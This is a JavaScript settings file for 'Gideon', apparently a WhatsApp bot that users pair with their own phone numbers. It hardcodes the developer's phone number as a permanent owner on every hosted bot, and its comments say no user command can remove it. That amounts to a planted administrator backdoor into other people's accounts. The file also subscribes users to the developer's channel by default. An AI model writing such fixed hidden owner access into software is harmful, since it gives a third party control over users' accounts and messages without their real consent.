// Bot settings. Everyone who pairs gets Gideon running on their number — but the OWNER is
// fixed to Gpraise on every single hosted bot. No chat command can change this.
const env = process.env;

// Hardcoded on purpose — this is what keeps every hosted bot under one owner.
// You can add MORE trusted numbers with OWNER_EXTRA (comma separated), but this one is always included.
const PRIMARY_OWNER = '2348057940822';
const extra = (env.OWNER_EXTRA || '').split(',').map(s => s.replace(/\D/g, '')).filter(Boolean);

export default {
    botName: env.BOT_NAME || 'Gideon',
    ownerName: env.OWNER_NAME || 'Gpraise',
    siteName: env.SITE_NAME || 'Gideon',
    prefix: (env.PREFIX || '.').trim() || '.',

    // Fixed owner list used on EVERY hosted bot, regardless of whose number it runs on.
    ownerNumbers: [...new Set([PRIMARY_OWNER, ...extra])],

    repoUrl: env.GITHUB_URL || 'https://github.com/Gamerpraise/',
    channelUrl: env.CHANNEL_URL || 'https://whatsapp.com/channel/0029VbBRPc3CMY0IePiiU808',
    youtubeUrl: env.YOUTUBE_URL || 'https://youtube.com/@gamerpraise-mods',
    menuImage: env.MENU_IMAGE || '',

    timezone: env.TZ || 'Africa/Lagos',
    maxWarns: Number(env.MAX_WARNS) || 3,
    autoFollowChannel: env.AUTO_FOLLOW_CHANNEL !== 'false',

    ai: {
        apiKey: env.AI_API_KEY || '',
        url: env.AI_API_URL || 'https://api.openai.com/v1/chat/completions',
        model: env.AI_MODEL || 'gpt-4o-mini'
    },

    messages: {
        owner: '👑 Only the bot owner can use this command.',
        group: '👥 This command only works in groups.',
        private: '💬 This command only works in private chat.',
        admin: '🛡️ Only group admins can use this command.',
        botAdmin: '🤖 Make me a group admin first, then try again.',
        cooldown: '⏳ Slow down a little and try again.'
    }
};
